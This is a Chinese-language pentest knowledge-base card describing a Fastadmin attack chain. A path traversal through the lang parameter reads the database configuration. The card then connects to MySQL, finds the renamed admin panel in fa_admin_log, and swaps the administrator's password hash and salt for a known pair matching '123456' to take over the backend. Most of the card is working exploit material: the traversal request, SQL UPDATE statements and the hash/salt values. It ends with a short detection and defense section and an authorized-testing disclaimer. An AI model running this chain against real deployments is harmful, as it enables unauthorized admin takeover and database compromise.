---
id: web-php-file-inclusion-fastadmin-lang-traversal-database-admin-takeover
title: Fastadmin lang 参数路径穿越读 database 配置：连库查 fa_admin_log 找后台入口并替换管理员密文登录
type: scenario
domain: web
path: web/php/file-inclusion
technique: fastadmin-lang-traversal-database-admin-takeover
tags:
- php
- fastadmin
- path-traversal
- file-read
- database
- credential-leak
- admin-takeover
- auth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V267
  verified_at: '2026-11-07T18:18:26+08:00'
  notes: 已对照原文与全部39张图核对：/index/ajax/lang?lang=../../application/database 路径穿越读取 database 配置（图09 JSON 含 hostname/root/3306/prefix fa_）、Navicat 连接（图10）、fa_admin_log 查后台入口（图12）、fa_admin 原密文 8de4d640da67a975aaa6b08c6001aea0/34512a（图14）替换为 c13f62012fd6a8fdf06b3452a94430e5/rpR6Bv 后 123456 登录（图15-16）、登录后恢复原密文，均与正文一致。核对中修正三处：删除无出处的'旧版 Fastadmin'版本断言（原文未给出受影响版本）、将 deny_module_list 说明改为原文图11 admin.php 注释依据。未验证点：原文未给具体版本，affected_versions 未设置；PoC 未复跑；密文/salt 按原文。
url: /docs/web/php/file-inclusion/web-php-file-inclusion-fastadmin-lang-traversal-database-admin-takeover/
draft: false
kb_aliases:
- Fastadmin 任意文件读取
- /index/ajax/lang 路径穿越
- Fastadmin database.php 泄露
- fa_admin_log 后台入口
- Fastadmin 密码密文替换
- c13f62012fd6a8fdf06b3452a94430e5
- 旁站 Fastadmin
---

## 一句话结论

Fastadmin 的 `/index/ajax/lang?lang=../../application/database` 可路径穿越读取数据库配置文件，拿到 MySQL 主机、账号与明文口令；直连数据库后从 `fa_admin_log` 的 URL 记录中找回被改名的后台入口，再把 `fa_admin` 表的 `password`/`salt` 替换为已知组合（`c13f62012fd6a8fdf06b3452a94430e5` + `rpR6Bv`，对应口令 `123456`）即可登录后台，登录后再恢复原密文避免影响业务。

## 原理

- **Fastadmin 的 lang 接口**：`/index/ajax/lang` 根据 `lang` 参数加载语言文件。目标部署未对参数做路径规范化，传入 `../../application/database` 可跳出语言目录，读取 ThinkPHP/Fastadmin 的数据库配置文件（`application/database.php`，无扩展名亦可），内容包含 `hostname`、`database`、`username`、`password`、`hostport` 等。
- **数据库即信任边界**：拿到数据库凭据后，如果 MySQL 端口可达（原文 3306，root 账号），可直接用 Navicat/CLI 连接。Fastadmin 的后台管理员、权限规则、操作日志都在同一库中，数据库权限高于后台账号权限。
- **后台入口改名也能找回**：Fastadmin 默认后台入口是 `admin.php`，安装后可手动改名（原文图 11 的 `admin.php` 源码注释也建议改名并同步修改 `config.php` 的 `deny_module_list`）。改名后入口不可猜，但 `fa_admin_log` 表记录所有后台操作，包括访问的 URL 路径；从中可直接看到实际入口文件名（如 `xlz6oc798sixadb.php`）。
- **密码存储**：`fa_admin` 表的 `password` 是“密文 + salt”形式，无法直接从 cmd5 反查。攻击者不需要破解：既然有数据库写权限，直接把目标管理员的 `password`/`salt` 改成已知组合，登录后再改回原值即可。原文给出的已知组合为 `password=c13f62012fd6a8fdf06b3452a94430e5`、`salt=rpR6Bv`，对应口令 `123456`。
- **旁站背景**：原文主资产（带二级路径）爆破无果，删除二级路径后发现根域是 Fastadmin 官网站，但 `/index/ajax/lang` 返回 404（不存在任意文件读取）；随后用资产测绘（FOFA/Hunter）找到同组织旁站，旁站同为 Fastadmin 且存在该文件读取，才打通链路。说明同一套 CMS 的不同部署漏洞状态可能不同，主站打不动时可检查旁站/同级资产。
- **风险控制**：修改 hash/salt 会影响真实管理员登录，原文在替换前保存原密文与 salt，登录后立即恢复；这是攻防演练中对业务影响最小化的做法。

## 触发条件

- 目标为存在该路径穿越的 Fastadmin 部署（原文未给出具体版本），`/index/ajax/lang` 能读取 `application/database` 配置文件。
- 配置中的 MySQL 端口可达（原文 3306），账号具备 `fa_admin`、`fa_admin_log` 等表的读写权限（原文为 root）。
- 后台入口被改名也没关系，`fa_admin_log` 有历史访问记录；若日志被清空，可尝试常见入口名或数据库中的其他线索。
- 已知的 password/salt 组合与目标 Fastadmin 版本的密码校验逻辑兼容（原文实测 `123456` 可登录）。
- 仅用于授权测试；替换密文前必须备份并尽快恢复。

## 利用步骤

1. 识别 Fastadmin：访问根域/静态资源/`admin.php` 登录页，或触发 `/index/ajax/lang` 的报错；确认是否为目标 CMS。
2. 测试路径穿越：请求 `/index/ajax/lang?lang=../../application/database`，若返回数据库配置（JSON/PHP 数组）而非 404/报错，记录 `hostname`、`database`、`username`、`password`、`hostport`。
3. 用 Navicat/MySQL CLI 连接数据库；列出 `fa_admin`、`fa_admin_log`、`fa_auth_rule` 等表。
4. 查询 `fa_admin_log` 的 `url` 字段（按 id/时间排序），找到后台入口文件名（被改名的 `xxx.php`），拼出登录 URL。
5. 查询 `fa_admin` 的 `id`、`username`、`password`、`salt`，先备份原值。
6. 执行 `UPDATE fa_admin SET password='c13f62012fd6a8fdf06b3452a94430e5', salt='rpR6Bv' WHERE id=<目标id>;`，用 `123456` 登录后台。
7. 登录成功后立即把 `password`/`salt` 恢复为备份值；保存后台会话，继续授权范围内的测试（如需 GetShell，见关联卡）。
8. 清理测试痕迹（如新增/修改的日志、临时账号），记录数据库连接与请求作为证据。

## PoC

任意文件读取：

```http
GET /index/ajax/lang?lang=../../application/database HTTP/1.1
Host: target
```

返回的配置关键字段（原文截图，值脱敏）：

```json
{
  "type": "mysql",
  "hostname": "127.0.0.1",
  "database": "fasta",
  "username": "root",
  "password": "<redacted>",
  "hostport": "3306",
  "charset": "utf8mb4",
  "prefix": "fa_"
}
```

数据库查询与密文替换：

```sql
-- 找被改名的后台入口
SELECT id, admin_id, username, url, title FROM fa_admin_log ORDER BY id DESC LIMIT 50;

-- 备份原密码
SELECT id, username, password, salt FROM fa_admin WHERE id = 1;

-- 替换为已知 hash/salt（对应 123456）
UPDATE fa_admin
SET password = 'c13f62012fd6a8fdf06b3452a94430e5', salt = 'rpR6Bv'
WHERE id = 1;

-- 登录后恢复
UPDATE fa_admin
SET password = '<original_password>', salt = '<original_salt>'
WHERE id = 1;
```

原文实测：替换后用 `123456` 成功登录 Fastadmin 后台；原密文为 `8de4d640da67a975aaa6b08c6001aea0`、salt `34512a`。

## 变体与关联

- **旁站/同级资产**：主站不存在该文件读取时，用 FOFA/Hunter 等资产测绘找同组织的其他 Fastadmin 部署；不同站点的版本/补丁状态不同，旁站可能仍存在。相关资产发现方法见 [[pentest-recon-equity-icp-subsidiary-domain-asset-discovery]]、[[pentest-recon-hidden-ip-c-segment-fofa-region-keyword]]。
- **后台入口线索**：除 `fa_admin_log` 外，`fa_auth_rule`、`fa_admin` 的登录记录、Web 访问日志、robots.txt、备份文件也可能泄露改名后的入口。
- **其他 Fastadmin 入口**：弱口令、`admin.php` 默认入口、插件市场/文件管理插件、权限规则代码注入（见关联卡）。
- **关联**：[[web-php-rce-fastadmin-auth-rule-condition-code-injection-webshell]]（拿到后台后用权限规则条件代码注入 GetShell）、[[web-php-framework-thinkphp-debug-sql-error-env-credential-leak]]（ThinkPHP 配置/凭据泄露）、[[pentest-lateral-movement-bladex-datasource-plaintext-credential-db-takeover]]（数据库明文口令接管）、[[web-generic-auth-dev-reset-admin-password-default]]（开发接口重置管理员口令）。

## 检测与防御

- **检测**：`/index/ajax/lang` 的 `lang` 参数出现 `../`、`..%2f`、绝对路径、`application/database` 等；同一 IP 在文件读取后短时间内出现 3306 连接/数据库查询；`fa_admin_log` 中出现异常入口访问；管理员密码 hash/salt 被批量更新。
- **防御**：升级 Fastadmin/修复 `lang` 参数路径穿越（白名单语言包、`basename`/规范化）；数据库不要使用 root 且禁止公网 3306；配置文件最小权限；后台入口改名只是隐藏，不能替代鉴权；监控 `fa_admin`/`fa_auth_rule` 的异常 UPDATE；密码重置走官方流程并强制二次验证。
- **应急**：发现 hash/salt 被替换时立即恢复并重置管理员口令；检查 `fa_admin_log` 与 Web 日志中的异常入口访问、数据库连接来源；排查是否进一步写入 WebShell。
